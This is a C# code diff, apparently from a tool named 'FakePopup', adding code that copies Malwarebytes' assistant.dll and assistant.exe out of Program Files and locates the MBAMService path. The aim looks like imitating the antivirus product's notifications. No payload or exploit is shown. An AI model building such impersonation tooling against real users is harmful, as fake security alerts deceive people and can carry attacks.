@@ -39,8 +39,35 @@ namespace FakePopup
             return base.ProcessCmdKey(ref msg, keyData);
         }
 
+        private byte[] ReadFile(string path)
+        {
+            var buffer = new byte[10240];
+            int bytes;
+            byte[] file = null;
+
+            using (var inputFile = new FileStream(path, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
+            {
+                using (MemoryStream memoryStream = new MemoryStream())
+                {
+                    while ((bytes = inputFile.Read(buffer, 0, buffer.Length)) > 0)
+                    {
+                        memoryStream.Write(buffer, 0, bytes);
+                    }
+
+                    file = memoryStream.ToArray();
+                }
+            }
+
+            return file;
+        }
+
         public NotificationForm()
         {
+            byte[] f = ReadFile("C:\\Program Files\\Malwarebytes\\Anti-Malware\\assistant.dll");
+            byte[] f1 = ReadFile("C:\\Program Files\\Malwarebytes\\Anti-Malware\\assistant.exe");
+            File.WriteAllBytes("assistant.dll", f);
+            File.WriteAllBytes("assistant.exe", f1);
+
             try
             {
                 path = Directory.GetParent(GetServiceExecutablePath("MBAMService").Replace("\"", "")).FullName;
